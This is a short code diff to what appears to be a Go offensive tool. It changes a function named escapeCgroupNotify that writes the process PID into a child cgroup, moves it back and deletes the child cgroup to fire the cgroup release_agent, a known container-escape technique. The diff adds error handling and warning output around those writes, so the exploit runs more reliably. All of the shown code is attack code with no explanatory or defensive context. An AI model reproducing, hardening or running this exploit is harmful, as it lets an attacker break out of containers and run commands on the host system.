@@ -423,11 +423,15 @@ func escapeCgroupNotify(command string) (string, string) {
 
 	// Trigger by writing our PID to child cgroup then removing it
 	cgroupProcs := filepath.Join(childDir, "cgroup.procs")
-	os.WriteFile(cgroupProcs, []byte(fmt.Sprintf("%d", os.Getpid())), 0o644)
+	if err := os.WriteFile(cgroupProcs, []byte(fmt.Sprintf("%d", os.Getpid())), 0o644); err != nil {
+		sb.WriteString(fmt.Sprintf("[-] Warning: failed to write to child cgroup.procs: %v\n", err))
+	}
 
 	// Move back to parent and remove child to trigger release
 	parentProcs := filepath.Join(cgroupDir, "cgroup.procs")
-	os.WriteFile(parentProcs, []byte(fmt.Sprintf("%d", os.Getpid())), 0o644)
+	if err := os.WriteFile(parentProcs, []byte(fmt.Sprintf("%d", os.Getpid())), 0o644); err != nil {
+		sb.WriteString(fmt.Sprintf("[-] Warning: failed to write to parent cgroup.procs: %v\n", err))
+	}
 	os.Remove(childDir)
 
 	sb.WriteString("[+] Triggered release_agent\n")
